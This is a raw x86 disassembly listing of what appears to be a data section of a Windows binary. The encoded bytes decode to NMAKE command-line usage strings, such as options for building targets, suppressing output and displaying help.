  438649:	add    BYTE PTR [ebp+0x0],ch
  43864c:	ins    DWORD PTR es:[edi],dx
  43864d:	add    BYTE PTR [ecx+0x0],ah
  438650:	outs   dx,BYTE PTR ds:[esi]
  438651:	add    BYTE PTR [eax+eax*1+0x66],ah
  438655:	add    BYTE PTR [ecx+0x0],ch
  438658:	ins    BYTE PTR es:[edi],dx
  438659:	add    BYTE PTR [ebp+0x0],ah
  43865c:	add    BYTE PTR [eax],al
  43865e:	inc    ebx
  43865f:	add    BYTE PTR [ecx],cl
  438661:	add    BYTE PTR ds:0x20007300,ah
  438667:	add    BYTE PTR [ebx+0x0],bl
  43866a:	outs   dx,DWORD PTR ds:[esi]
  43866b:	add    BYTE PTR [eax+0x0],dh
  43866e:	je     0x438670
  438670:	imul   eax,DWORD PTR [eax],0x6e006f
  438676:	jae    0x438678
  438678:	pop    ebp
  438679:	add    BYTE PTR [eax],ah
  43867b:	add    BYTE PTR [ebx+0x0],bl
  43867e:	das    
  43867f:	add    BYTE PTR [esi+0x0],ah
  438682:	and    BYTE PTR [eax],al
  438684:	ins    DWORD PTR es:[edi],dx
  438685:	add    BYTE PTR [ecx+0x0],ah
  438688:	imul   eax,DWORD PTR [eax],0x65
  43868b:	add    BYTE PTR [esi+0x0],ah
  43868e:	imul   eax,DWORD PTR [eax],0x65006c
  438694:	pop    ebp
  438695:	add    BYTE PTR [eax],ah
  438697:	add    BYTE PTR [ebx+0x0],bl
  43869a:	das    
  43869b:	add    BYTE PTR [eax+0x0],bh
  43869e:	and    BYTE PTR [eax],al
  4386a0:	jae    0x4386a2
  4386a2:	je     0x4386a4
  4386a4:	add    BYTE PTR fs:[ebp+0x0],ah
  4386a8:	jb     0x4386aa
  4386aa:	jb     0x4386ac
  4386ac:	data16 add BYTE PTR [ecx+0x0],ch
  4386b0:	ins    BYTE PTR es:[edi],dx
  4386b1:	add    BYTE PTR [ebp+0x0],ah
  4386b4:	pop    ebp
  4386b5:	add    BYTE PTR [eax],ah
  4386b7:	add    BYTE PTR [ebx+0x0],bl
  4386ba:	ins    DWORD PTR es:[edi],dx
  4386bb:	add    BYTE PTR [ecx+0x0],ah
  4386be:	arpl   WORD PTR [eax],ax
  4386c0:	jb     0x4386c2
  4386c2:	outs   dx,DWORD PTR ds:[esi]
  4386c3:	add    BYTE PTR [eax+eax*1+0x65],ah
  4386c7:	add    BYTE PTR [esi+0x0],ah
  4386ca:	jae    0x4386cc
  4386cc:	pop    ebp
  4386cd:	add    BYTE PTR [eax],ah
  4386cf:	add    BYTE PTR [ebx+0x0],bl
  4386d2:	je     0x4386d4
  4386d4:	popa   
  4386d5:	add    BYTE PTR [edx+0x0],dh
  4386d8:	add    BYTE PTR [di+0x0],ah
  4386dc:	je     0x4386de
  4386de:	jae    0x4386e0
  4386e0:	pop    ebp
  4386e1:	add    BYTE PTR [edx],cl
  4386e3:	add    BYTE PTR [eax],al
  4386e5:	add    BYTE PTR [edx],cl
  4386e7:	add    BYTE PTR [edi+0x0],cl
  4386ea:	jo     0x4386ec
  4386ec:	je     0x4386ee
  4386ee:	imul   eax,DWORD PTR [eax],0x6e006f
  4386f4:	jae    0x4386f6
  4386f6:	cmp    al,BYTE PTR [eax]
  4386f8:	or     al,BYTE PTR [eax]
  4386fa:	add    BYTE PTR [eax],al
  4386fc:	pop    ds
  4386fd:	add    BYTE PTR [edi],ch
  4386ff:	add    BYTE PTR [ecx+0x0],al
  438702:	and    BYTE PTR [eax],al
  438704:	inc    edx
  438705:	add    BYTE PTR [ebp+0x0],dh
  438708:	imul   eax,DWORD PTR [eax],0x64006c
  43870e:	and    BYTE PTR [eax],al
  438710:	popa   
  438711:	add    BYTE PTR [eax+eax*1+0x6c],ch
  438715:	add    BYTE PTR [eax],ah
  438717:	add    BYTE PTR [ebp+0x0],ah
  43871a:	jbe    0x43871c
  43871c:	popa   
  43871d:	add    BYTE PTR [eax+eax*1+0x75],ch
  438721:	add    BYTE PTR [ecx+0x0],ah
  438724:	je     0x438726
  438726:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  43872b:	add    BYTE PTR [eax+eax*1+0x61],dh
  43872f:	add    BYTE PTR [edx+0x0],dh
  438732:	add    BYTE PTR [di+0x0],ah
  438736:	je     0x438738
  438738:	jae    0x43873a
  43873a:	add    BYTE PTR [eax],al
  43873c:	and    al,BYTE PTR [eax]
  43873e:	das    
  43873f:	add    BYTE PTR [edx+0x0],al
  438742:	and    BYTE PTR [eax],al
  438744:	inc    edx
  438745:	add    BYTE PTR [ebp+0x0],dh
  438748:	imul   eax,DWORD PTR [eax],0x64006c
  43874e:	and    BYTE PTR [eax],al
  438750:	imul   eax,DWORD PTR [eax],0x200066
  438756:	je     0x438758
  438758:	imul   eax,DWORD PTR [eax],0x65006d
  43875e:	and    BYTE PTR [eax],al
  438760:	jae    0x438762
  438762:	je     0x438764
  438764:	popa   
  438765:	add    BYTE PTR [ebp+0x0],ch
  438768:	jo     0x43876a
  43876a:	jae    0x43876c
  43876c:	and    BYTE PTR [eax],al
  43876e:	popa   
  43876f:	add    BYTE PTR [edx+0x0],dh
  438772:	add    BYTE PTR gs:[eax],ah
  438775:	add    BYTE PTR [ebp+0x0],ah
  438778:	jno    0x43877a
  43877a:	jne    0x43877c
  43877c:	popa   
  43877d:	add    BYTE PTR [eax+eax*1+0x0],ch
  438781:	add    BYTE PTR [eax+eax*1],bl
  438784:	das    
  438785:	add    BYTE PTR [ebx+0x0],al
  438788:	and    BYTE PTR [eax],al
  43878a:	push   ebx
  43878b:	add    BYTE PTR [ebp+0x0],dh
  43878e:	jo     0x438790
  438790:	jo     0x438792
  438792:	jb     0x438794
  438794:	add    BYTE PTR gs:[ebx+0x0],dh
  438798:	jae    0x43879a
  43879a:	and    BYTE PTR [eax],al
  43879c:	outs   dx,DWORD PTR ds:[esi]
  43879d:	add    BYTE PTR [ebp+0x0],dh
  4387a0:	je     0x4387a2
  4387a2:	jo     0x4387a4
  4387a4:	jne    0x4387a6
  4387a6:	je     0x4387a8
  4387a8:	and    BYTE PTR [eax],al
  4387aa:	ins    DWORD PTR es:[edi],dx
  4387ab:	add    BYTE PTR [ebp+0x0],ah
  4387ae:	jae    0x4387b0
  4387b0:	jae    0x4387b2
  4387b2:	popa   
  4387b3:	add    BYTE PTR [edi+0x0],ah
  4387b6:	add    BYTE PTR gs:[ebx+0x0],dh
  4387ba:	add    BYTE PTR [eax],al
  4387bc:	sbb    eax,0x44002f00
  4387c1:	add    BYTE PTR [eax],ah
  4387c3:	add    BYTE PTR [eax+eax*1+0x69],al
  4387c7:	add    BYTE PTR [ebx+0x0],dh
  4387ca:	jo     0x4387cc
  4387cc:	ins    BYTE PTR es:[edi],dx
  4387cd:	add    BYTE PTR [ecx+0x0],ah
  4387d0:	jns    0x4387d2
  4387d2:	and    BYTE PTR [eax],al
  4387d4:	bound  eax,QWORD PTR [eax]
  4387d6:	jne    0x4387d8
  4387d8:	imul   eax,DWORD PTR [eax],0x64006c
  4387de:	and    BYTE PTR [eax],al
  4387e0:	imul   eax,DWORD PTR [eax],0x66006e
  4387e6:	outs   dx,DWORD PTR ds:[esi]
  4387e7:	add    BYTE PTR [edx+0x0],dh
  4387ea:	ins    DWORD PTR es:[edi],dx
  4387eb:	add    BYTE PTR [ecx+0x0],ah
  4387ee:	je     0x4387f0
  4387f0:	imul   eax,DWORD PTR [eax],0x6e006f
  4387f6:	add    BYTE PTR [eax],al
  4387f8:	sbb    eax,DWORD PTR [eax]
  4387fa:	das    
  4387fb:	add    BYTE PTR [ebp+0x0],al
  4387fe:	and    BYTE PTR [eax],al
  438800:	dec    edi
  438801:	add    BYTE PTR [esi+0x0],dh
  438804:	add    BYTE PTR gs:[edx+0x0],dh
  438808:	jb     0x43880a
  43880a:	imul   eax,DWORD PTR [eax],0x650064
  438810:	and    BYTE PTR [eax],al
  438812:	add    BYTE PTR gs:[esi+0x0],ch
  438816:	jbe    0x438818
  438818:	sub    eax,0x61007600
  43881d:	add    BYTE PTR [edx+0x0],dh
  438820:	and    BYTE PTR [eax],al
  438822:	ins    DWORD PTR es:[edi],dx
  438823:	add    BYTE PTR [ecx+0x0],ah
  438826:	arpl   WORD PTR [eax],ax
  438828:	jb     0x43882a
  43882a:	outs   dx,DWORD PTR ds:[esi]
  43882b:	add    BYTE PTR [ebx+0x0],dh
  43882e:	add    BYTE PTR [eax],al
  438830:	inc    ecx
  438831:	add    BYTE PTR [edi],ch
  438833:	add    BYTE PTR [ebp+0x0],al
  438836:	push   edx
  438837:	add    BYTE PTR [edx+0x0],dl
  43883a:	dec    edi
  43883b:	add    BYTE PTR [edx+0x0],dl
  43883e:	push   edx
  43883f:	add    BYTE PTR [ebp+0x0],al
  438842:	push   eax
  438843:	add    BYTE PTR [edi+0x0],cl
  438846:	push   edx
  438847:	add    BYTE PTR [eax+eax*1+0x3a],dl
  43884b:	add    BYTE PTR [ebx+0x0],bh
  43884e:	dec    esi
  43884f:	add    BYTE PTR [edi+0x0],cl
  438852:	dec    esi
  438853:	add    BYTE PTR [ebp+0x0],al
  438856:	jl     0x438858
  438858:	push   eax
  438859:	add    BYTE PTR [edx+0x0],dl
  43885c:	dec    edi
  43885d:	add    BYTE PTR [ebp+0x0],cl
  438860:	push   eax
  438861:	add    BYTE PTR [eax+eax*1+0x7c],dl
  438865:	add    BYTE PTR [ecx+0x0],dl
  438868:	push   ebp
  438869:	add    BYTE PTR [ebp+0x0],al
  43886c:	push   ebp
  43886d:	add    BYTE PTR [ebp+0x0],al
  438870:	jl     0x438872
  438872:	push   ebx
  438873:	add    BYTE PTR [ebp+0x0],al
  438876:	dec    esi
  438877:	add    BYTE PTR [eax+eax*1+0x7d],al
  43887b:	add    BYTE PTR [eax],ah
  43887d:	add    BYTE PTR [edx+0x0],dl
  438880:	add    BYTE PTR gs:[eax+0x0],dh
  438884:	outs   dx,DWORD PTR ds:[esi]
  438885:	add    BYTE PTR [edx+0x0],dh
  438888:	je     0x43888a
  43888a:	and    BYTE PTR [eax],al
  43888c:	add    BYTE PTR gs:[edx+0x0],dh
  438890:	jb     0x438892
  438892:	outs   dx,DWORD PTR ds:[esi]
  438893:	add    BYTE PTR [edx+0x0],dh
  438896:	jae    0x438898
  438898:	and    BYTE PTR [eax],al
  43889a:	je     0x43889c
  43889c:	outs   dx,DWORD PTR ds:[esi]
  43889d:	add    BYTE PTR [eax],ah
  43889f:	add    BYTE PTR [ebp+0x0],cl
  4388a2:	imul   eax,DWORD PTR [eax],0x720063
  4388a8:	outs   dx,DWORD PTR ds:[esi]
  4388a9:	add    BYTE PTR [ebx+0x0],dh
  4388ac:	outs   dx,DWORD PTR ds:[esi]
  4388ad:	add    BYTE PTR [esi+0x0],ah
  4388b0:	je     0x4388b2
  4388b2:	add    BYTE PTR [eax],al
  4388b4:	push   ds
  4388b5:	add    BYTE PTR [edi],ch
  4388b7:	add    BYTE PTR [edi+0x0],al
  4388ba:	and    BYTE PTR [eax],al
  4388bc:	inc    esp
  4388bd:	add    BYTE PTR [ecx+0x0],ch
  4388c0:	jae    0x4388c2
  4388c2:	jo     0x4388c4
  4388c4:	ins    BYTE PTR es:[edi],dx
  4388c5:	add    BYTE PTR [ecx+0x0],ah
  4388c8:	jns    0x4388ca
  4388ca:	and    BYTE PTR [eax],al
  4388cc:	and    DWORD PTR [eax],eax
  4388ce:	imul   eax,DWORD PTR [eax],0x63006e
  4388d4:	ins    BYTE PTR es:[edi],dx
  4388d5:	add    BYTE PTR [ebp+0x0],dh
  4388d8:	add    BYTE PTR fs:[ebp+0x0],ah
  4388dc:	and    BYTE PTR [eax],al
  4388de:	data16 add BYTE PTR [ecx+0x0],ch
  4388e2:	ins    BYTE PTR es:[edi],dx
  4388e3:	add    BYTE PTR [ebp+0x0],ah
  4388e6:	outs   dx,BYTE PTR ds:[esi]
  4388e7:	add    BYTE PTR [ecx+0x0],ah
  4388ea:	ins    DWORD PTR es:[edi],dx
  4388eb:	add    BYTE PTR [ebp+0x0],ah
  4388ee:	jae    0x4388f0
  4388f0:	add    BYTE PTR [eax],al
  4388f2:	and    al,BYTE PTR [eax]
  4388f4:	das    
  4388f5:	add    BYTE PTR [eax+0x0],cl
  4388f8:	inc    ebp
  4388f9:	add    BYTE PTR [eax+eax*1+0x50],cl
  4388fd:	add    BYTE PTR [eax],ah
  4388ff:	add    BYTE PTR [eax+eax*1+0x69],al
  438903:	add    BYTE PTR [ebx+0x0],dh
  438906:	jo     0x438908
  438908:	ins    BYTE PTR es:[edi],dx
  438909:	add    BYTE PTR [ecx+0x0],ah
  43890c:	jns    0x43890e
  43890e:	and    BYTE PTR [eax],al
  438910:	bound  eax,QWORD PTR [eax]
  438912:	jb     0x438914
  438914:	imul   eax,DWORD PTR [eax],0x660065
  43891a:	and    BYTE PTR [eax],al
  43891c:	jne    0x43891e
  43891e:	jae    0x438920
  438920:	popa   
  438921:	add    BYTE PTR [edi+0x0],ah
  438924:	add    BYTE PTR gs:[eax],ah
  438927:	add    BYTE PTR [ebp+0x0],ch
  43892a:	add    BYTE PTR gs:[ebx+0x0],dh
  43892e:	jae    0x438930
  438930:	popa   
  438931:	add    BYTE PTR [edi+0x0],ah
  438934:	add    BYTE PTR gs:[eax],al
  438937:	add    BYTE PTR [ebx],ah
  438939:	add    BYTE PTR [edi],ch
  43893b:	add    BYTE PTR [ecx+0x0],cl
  43893e:	and    BYTE PTR [eax],al
  438940:	dec    ecx
  438941:	add    BYTE PTR [edi+0x0],ah
  438944:	outs   dx,BYTE PTR ds:[esi]
  438945:	add    BYTE PTR [edi+0x0],ch
  438948:	jb     0x43894a
  43894a:	add    BYTE PTR gs:[eax],ah
  43894d:	add    BYTE PTR [ebp+0x0],ah
  438950:	js     0x438952
  438952:	imul   eax,DWORD PTR [eax],0x200074
  438958:	arpl   WORD PTR [eax],ax
  43895a:	outs   dx,DWORD PTR ds:[esi]
  43895b:	add    BYTE PTR [eax+eax*1+0x65],ah
  43895f:	add    BYTE PTR [ebx+0x0],dh
  438962:	and    BYTE PTR [eax],al
  438964:	data16 add BYTE PTR [edx+0x0],dh
  438968:	outs   dx,DWORD PTR ds:[esi]
  438969:	add    BYTE PTR [ebp+0x0],ch
  43896c:	and    BYTE PTR [eax],al
  43896e:	arpl   WORD PTR [eax],ax
  438970:	outs   dx,DWORD PTR ds:[esi]
  438971:	add    BYTE PTR [ebp+0x0],ch
  438974:	ins    DWORD PTR es:[edi],dx
  438975:	add    BYTE PTR [ecx+0x0],ah
  438978:	outs   dx,BYTE PTR ds:[esi]
  438979:	add    BYTE PTR [eax+eax*1+0x73],ah
  43897d:	add    BYTE PTR [eax],al
  43897f:	add    BYTE PTR [eax+eax*1],ah
  438982:	das    
  438983:	add    BYTE PTR [ebx+0x0],cl
  438986:	and    BYTE PTR [eax],al
  438988:	inc    edx
  438989:	add    BYTE PTR [ebp+0x0],dh
  43898c:	imul   eax,DWORD PTR [eax],0x64006c
  438992:	and    BYTE PTR [eax],al
  438994:	jne    0x438996
  438996:	outs   dx,BYTE PTR ds:[esi]
  438997:	add    BYTE PTR [edx+0x0],dh
  43899a:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  43899f:	add    BYTE PTR [eax+eax*1+0x65],dh
  4389a3:	add    BYTE PTR [eax+eax*1+0x20],ah
  4389a7:	add    BYTE PTR [eax+eax*1+0x61],dh
  4389ab:	add    BYTE PTR [edx+0x0],dh
  4389ae:	add    BYTE PTR [di+0x0],ah
  4389b2:	je     0x4389b4
  4389b4:	jae    0x4389b6
  4389b6:	and    BYTE PTR [eax],al
  4389b8:	outs   dx,DWORD PTR ds:[esi]
  4389b9:	add    BYTE PTR [esi+0x0],ch
  4389bc:	and    BYTE PTR [eax],al
  4389be:	add    BYTE PTR gs:[edx+0x0],dh
  4389c2:	jb     0x4389c4
  4389c4:	outs   dx,DWORD PTR ds:[esi]
  4389c5:	add    BYTE PTR [edx+0x0],dh
  4389c8:	add    BYTE PTR [eax],al
  4389ca:	and    eax,DWORD PTR [eax]
  4389cc:	das    
  4389cd:	add    BYTE PTR [ebp+0x0],cl
  4389d0:	and    BYTE PTR [eax],al
  4389d2:	dec    ecx
  4389d3:	add    BYTE PTR [edi+0x0],ah
  4389d6:	outs   dx,BYTE PTR ds:[esi]
  4389d7:	add    BYTE PTR [edi+0x0],ch
  4389da:	jb     0x4389dc
  4389dc:	add    BYTE PTR gs:[eax],ah
  4389df:	add    BYTE PTR [ebp+0x0],ah
  4389e2:	js     0x4389e4
  4389e4:	je     0x4389e6
  4389e6:	add    BYTE PTR gs:[esi+0x0],ch
  4389ea:	add    BYTE PTR fs:[ebp+0x0],ah
  4389ee:	add    BYTE PTR fs:[edi],ch
  4389f1:	add    BYTE PTR [ebp+0x0],ah
  4389f4:	js     0x4389f6
  4389f6:	jo     0x4389f8
  4389f8:	popa   
  4389f9:	add    BYTE PTR [esi+0x0],ch
  4389fc:	add    BYTE PTR fs:[ebp+0x0],ah
  438a00:	add    BYTE PTR fs:[eax],ah
  438a03:	add    BYTE PTR [ebp+0x0],ch
  438a06:	add    BYTE PTR gs:[ebp+0x0],ch
  438a0a:	outs   dx,DWORD PTR ds:[esi]
  438a0b:	add    BYTE PTR [edx+0x0],dh
  438a0e:	jns    0x438a10
  438a10:	add    BYTE PTR [eax],al
  438a12:	daa    
  438a13:	add    BYTE PTR [edi],ch
  438a15:	add    BYTE PTR [esi+0x0],cl
  438a18:	and    BYTE PTR [eax],al
  438a1a:	inc    esp
  438a1b:	add    BYTE PTR [ecx+0x0],ch
  438a1e:	jae    0x438a20
  438a20:	jo     0x438a22
  438a22:	ins    BYTE PTR es:[edi],dx
  438a23:	add    BYTE PTR [ecx+0x0],ah
  438a26:	jns    0x438a28
  438a28:	and    BYTE PTR [eax],al
  438a2a:	arpl   WORD PTR [eax],ax
  438a2c:	outs   dx,DWORD PTR ds:[esi]
  438a2d:	add    BYTE PTR [ebp+0x0],ch
  438a30:	ins    DWORD PTR es:[edi],dx
  438a31:	add    BYTE PTR [ecx+0x0],ah
  438a34:	outs   dx,BYTE PTR ds:[esi]
  438a35:	add    BYTE PTR [eax+eax*1+0x73],ah
  438a39:	add    BYTE PTR [eax],ah
  438a3b:	add    BYTE PTR [edx+0x0],ah
  438a3e:	jne    0x438a40
  438a40:	je     0x438a42
  438a42:	and    BYTE PTR [eax],al
  438a44:	add    BYTE PTR fs:[edi+0x0],ch
  438a48:	and    BYTE PTR [eax],al
  438a4a:	outs   dx,BYTE PTR ds:[esi]
  438a4b:	add    BYTE PTR [edi+0x0],ch
  438a4e:	je     0x438a50
  438a50:	and    BYTE PTR [eax],al
  438a52:	add    BYTE PTR gs:[eax+0x0],bh
  438a56:	add    BYTE PTR gs:[ebx+0x0],ah
  438a5a:	jne    0x438a5c
  438a5c:	je     0x438a5e
  438a5e:	add    BYTE PTR gs:[eax],al
  438a61:	add    BYTE PTR [ebx],ah
  438a63:	add    BYTE PTR [edi],ch
  438a65:	add    BYTE PTR [esi+0x0],cl
  438a68:	dec    edi
  438a69:	add    BYTE PTR [eax+eax*1+0x4f],cl
  438a6d:	add    BYTE PTR [edi+0x0],al
  438a70:	dec    edi
  438a71:	add    BYTE PTR [eax],ah
  438a73:	add    BYTE PTR [ebx+0x0],dl
  438a76:	jne    0x438a78
  438a78:	jo     0x438a7a
  438a7a:	jo     0x438a7c
  438a7c:	jb     0x438a7e
  438a7e:	add    BYTE PTR gs:[ebx+0x0],dh
  438a82:	jae    0x438a84
  438a84:	and    BYTE PTR [eax],al
  438a86:	arpl   WORD PTR [eax],ax
  438a88:	outs   dx,DWORD PTR ds:[esi]
  438a89:	add    BYTE PTR [eax+0x0],dh
  438a8c:	jns    0x438a8e
  438a8e:	jb     0x438a90
  438a90:	imul   eax,DWORD PTR [eax],0x680067
  438a96:	je     0x438a98
  438a98:	and    BYTE PTR [eax],al
  438a9a:	ins    DWORD PTR es:[edi],dx
  438a9b:	add    BYTE PTR [ebp+0x0],ah
  438a9e:	jae    0x438aa0
  438aa0:	jae    0x438aa2
  438aa2:	popa   
  438aa3:	add    BYTE PTR [edi+0x0],ah
  438aa6:	add    BYTE PTR gs:[eax],al
  438aa9:	add    BYTE PTR ds:0x50002f00,bl
  438aaf:	add    BYTE PTR [eax],ah
  438ab1:	add    BYTE PTR [eax+eax*1+0x69],al
  438ab5:	add    BYTE PTR [ebx+0x0],dh
  438ab8:	jo     0x438aba
  438aba:	ins    BYTE PTR es:[edi],dx
  438abb:	add    BYTE PTR [ecx+0x0],ah
  438abe:	jns    0x438ac0
  438ac0:	and    BYTE PTR [eax],al
  438ac2:	dec    esi
  438ac3:	add    BYTE PTR [ebp+0x0],cl
  438ac6:	inc    ecx
  438ac7:	add    BYTE PTR [ebx+0x0],cl
  438aca:	inc    ebp
  438acb:	add    BYTE PTR [eax],ah
  438acd:	add    BYTE PTR [ecx+0x0],ch
  438ad0:	outs   dx,BYTE PTR ds:[esi]
  438ad1:	add    BYTE PTR [esi+0x0],ah
  438ad4:	outs   dx,DWORD PTR ds:[esi]
  438ad5:	add    BYTE PTR [edx+0x0],dh
  438ad8:	ins    DWORD PTR es:[edi],dx
  438ad9:	add    BYTE PTR [ecx+0x0],ah
  438adc:	je     0x438ade
  438ade:	imul   eax,DWORD PTR [eax],0x6e006f
  438ae4:	add    BYTE PTR [eax],al
  438ae6:	add    BYTE PTR es:[edi],ch
  438ae9:	add    BYTE PTR [ecx+0x0],dl
  438aec:	and    BYTE PTR [eax],al
  438aee:	inc    ebx
  438aef:	add    BYTE PTR [eax+0x0],ch
  438af2:	add    BYTE PTR gs:[ebx+0x0],ah
  438af6:	imul   eax,DWORD PTR [eax],0x20
  438af9:	add    BYTE PTR [eax+eax*1+0x69],dh
  438afd:	add    BYTE PTR [ebp+0x0],ch
  438b00:	add    BYTE PTR gs:[eax],ah
  438b03:	add    BYTE PTR [ebx+0x0],dh
  438b06:	je     0x438b08
  438b08:	popa   
  438b09:	add    BYTE PTR [ebp+0x0],ch
  438b0c:	jo     0x438b0e
  438b0e:	jae    0x438b10
  438b10:	and    BYTE PTR [eax],al
  438b12:	bound  eax,QWORD PTR [eax]
  438b14:	jne    0x438b16
  438b16:	je     0x438b18
  438b18:	and    BYTE PTR [eax],al
  438b1a:	add    BYTE PTR fs:[edi+0x0],ch
  438b1e:	and    BYTE PTR [eax],al
  438b20:	outs   dx,BYTE PTR ds:[esi]
  438b21:	add    BYTE PTR [edi+0x0],ch
  438b24:	je     0x438b26
  438b26:	and    BYTE PTR [eax],al
  438b28:	bound  eax,QWORD PTR [eax]
  438b2a:	jne    0x438b2c
  438b2c:	imul   eax,DWORD PTR [eax],0x64006c
  438b32:	add    BYTE PTR [eax],al
  438b34:	and    al,BYTE PTR [eax]
  438b36:	das    
  438b37:	add    BYTE PTR [edx+0x0],dl
  438b3a:	and    BYTE PTR [eax],al
  438b3c:	dec    ecx
  438b3d:	add    BYTE PTR [edi+0x0],ah
  438b40:	outs   dx,BYTE PTR ds:[esi]
  438b41:	add    BYTE PTR [edi+0x0],ch
  438b44:	jb     0x438b46
  438b46:	add    BYTE PTR gs:[eax],ah
  438b49:	add    BYTE PTR [eax+0x0],dh
  438b4c:	jb     0x438b4e
  438b4e:	add    BYTE PTR gs:[eax+eax*1+0x65],ah
  438b53:	add    BYTE PTR [esi+0x0],ah
  438b56:	imul   eax,DWORD PTR [eax],0x65006e
  438b5c:	add    BYTE PTR fs:[eax],ah
  438b5f:	add    BYTE PTR [edx+0x0],dh
  438b62:	jne    0x438b64
  438b64:	ins    BYTE PTR es:[edi],dx
  438b65:	add    BYTE PTR [ebp+0x0],ah
  438b68:	jae    0x438b6a
  438b6a:	das    
  438b6b:	add    BYTE PTR [ebp+0x0],ch
  438b6e:	popa   
  438b6f:	add    BYTE PTR [ebx+0x0],ah
  438b72:	jb     0x438b74
  438b74:	outs   dx,DWORD PTR ds:[esi]
  438b75:	add    BYTE PTR [ebx+0x0],dh
  438b78:	add    BYTE PTR [eax],al
  438b7a:	add    BYTE PTR es:[edi],ch
  438b7d:	add    BYTE PTR [ebx+0x0],dl
  438b80:	and    BYTE PTR [eax],al
  438b82:	push   ebx
  438b83:	add    BYTE PTR [ebp+0x0],dh
  438b86:	jo     0x438b88
  438b88:	jo     0x438b8a
  438b8a:	jb     0x438b8c
  438b8c:	add    BYTE PTR gs:[ebx+0x0],dh
  438b90:	jae    0x438b92
  438b92:	and    BYTE PTR [eax],al
  438b94:	add    BYTE PTR gs:[eax+0x0],bh
  438b98:	add    BYTE PTR gs:[ebx+0x0],ah
  438b9c:	jne    0x438b9e
  438b9e:	je     0x438ba0
  438ba0:	add    BYTE PTR gs:[eax+eax*1+0x2d],ah
  438ba5:	add    BYTE PTR [ebx+0x0],ah
  438ba8:	outs   dx,DWORD PTR ds:[esi]
  438ba9:	add    BYTE PTR [ebp+0x0],ch
  438bac:	ins    DWORD PTR es:[edi],dx
  438bad:	add    BYTE PTR [ecx+0x0],ah
  438bb0:	outs   dx,BYTE PTR ds:[esi]
  438bb1:	add    BYTE PTR [eax+eax*1+0x73],ah
  438bb5:	add    BYTE PTR [eax],ah
  438bb7:	add    BYTE PTR [eax+eax*1+0x69],ah
  438bbb:	add    BYTE PTR [ebx+0x0],dh
  438bbe:	jo     0x438bc0
  438bc0:	ins    BYTE PTR es:[edi],dx
  438bc1:	add    BYTE PTR [ecx+0x0],ah
  438bc4:	jns    0x438bc6
  438bc6:	add    BYTE PTR [eax],al
  438bc8:	daa    
  438bc9:	add    BYTE PTR [edi],ch
  438bcb:	add    BYTE PTR [eax+eax*1+0x20],dl
  438bcf:	add    BYTE PTR [ebx+0x0],al
  438bd2:	push   0x6e006100
  438bd7:	add    BYTE PTR [edi+0x0],ah
  438bda:	add    BYTE PTR gs:[eax],ah
  438bdd:	add    BYTE PTR [eax+eax*1+0x69],dh
  438be1:	add    BYTE PTR [ebp+0x0],ch
  438be4:	add    BYTE PTR gs:[eax],ah
  438be7:	add    BYTE PTR [ebx+0x0],dh
  438bea:	je     0x438bec
  438bec:	popa   
  438bed:	add    BYTE PTR [ebp+0x0],ch
  438bf0:	jo     0x438bf2
  438bf2:	jae    0x438bf4
  438bf4:	and    BYTE PTR [eax],al
  438bf6:	bound  eax,QWORD PTR [eax]
  438bf8:	jne    0x438bfa
  438bfa:	je     0x438bfc
  438bfc:	and    BYTE PTR [eax],al
  438bfe:	add    BYTE PTR fs:[edi+0x0],ch
  438c02:	and    BYTE PTR [eax],al
  438c04:	outs   dx,BYTE PTR ds:[esi]
  438c05:	add    BYTE PTR [edi+0x0],ch
  438c08:	je     0x438c0a
  438c0a:	and    BYTE PTR [eax],al
  438c0c:	bound  eax,QWORD PTR [eax]
  438c0e:	jne    0x438c10
  438c10:	imul   eax,DWORD PTR [eax],0x64006c
  438c16:	add    BYTE PTR [eax],al
  438c18:	and    eax,DWORD PTR [eax]
  438c1a:	das    
  438c1b:	add    BYTE PTR [esi+0x0],dl
  438c1e:	and    BYTE PTR [eax],al
  438c20:	dec    ecx
  438c21:	add    BYTE PTR [esi+0x0],ch
  438c24:	push   0x72006500
  438c29:	add    BYTE PTR [ecx+0x0],ch
  438c2c:	je     0x438c2e
  438c2e:	and    BYTE PTR [eax],al
  438c30:	ins    DWORD PTR es:[edi],dx
  438c31:	add    BYTE PTR [ecx+0x0],ah
  438c34:	arpl   WORD PTR [eax],ax
  438c36:	jb     0x438c38
  438c38:	outs   dx,DWORD PTR ds:[esi]
  438c39:	add    BYTE PTR [ebx+0x0],dh
  438c3c:	and    BYTE PTR [eax],al
  438c3e:	add    BYTE PTR fs:[ebp+0x0],dh
  438c42:	jb     0x438c44
  438c44:	imul   eax,DWORD PTR [eax],0x67006e
  438c4a:	and    BYTE PTR [eax],al
  438c4c:	jb     0x438c4e
  438c4e:	add    BYTE PTR gs:[ebx+0x0],ah
  438c52:	jne    0x438c54
  438c54:	jb     0x438c56
  438c56:	jae    0x438c58
  438c58:	imul   eax,DWORD PTR [eax],0x6e006f
  438c5e:	add    BYTE PTR [eax],al
  438c60:	adc    eax,0x55002f00
  438c65:	add    BYTE PTR [eax],ah
  438c67:	add    BYTE PTR [eax+eax*1+0x75],al
  438c6b:	add    BYTE PTR [ebp+0x0],ch
  438c6e:	jo     0x438c70
  438c70:	and    BYTE PTR [eax],al
  438c72:	imul   eax,DWORD PTR [eax],0x6c006e
  438c78:	imul   eax,DWORD PTR [eax],0x65006e
  438c7e:	and    BYTE PTR [eax],al
  438c80:	data16 add BYTE PTR [ecx+0x0],ch
  438c84:	ins    BYTE PTR es:[edi],dx
  438c85:	add    BYTE PTR [ebp+0x0],ah
  438c88:	jae    0x438c8a
  438c8a:	add    BYTE PTR [eax],al
  438c8c:	push   ss
  438c8d:	add    BYTE PTR [edi],ch
  438c8f:	add    BYTE PTR [ecx+0x0],bl
  438c92:	and    BYTE PTR [eax],al
  438c94:	inc    esp
  438c95:	add    BYTE PTR [ecx+0x0],ch
  438c98:	jae    0x438c9a
  438c9a:	popa   
  438c9b:	add    BYTE PTR [edx+0x0],ah
  438c9e:	ins    BYTE PTR es:[edi],dx
  438c9f:	add    BYTE PTR [ebp+0x0],ah
  438ca2:	and    BYTE PTR [eax],al
  438ca4:	bound  eax,QWORD PTR [eax]
  438ca6:	popa   
  438ca7:	add    BYTE PTR [eax+eax*1+0x63],dh
  438cab:	add    BYTE PTR [eax+0x0],ch
  438cae:	sub    eax,0x6f006d00
  438cb3:	add    BYTE PTR [eax+eax*1+0x65],ah
  438cb7:	add    BYTE PTR [eax],al
  438cb9:	add    BYTE PTR [eax],ah
  438cbb:	add    BYTE PTR [edi],ch
  438cbd:	add    BYTE PTR [edi],bh
  438cbf:	add    BYTE PTR [eax],ah
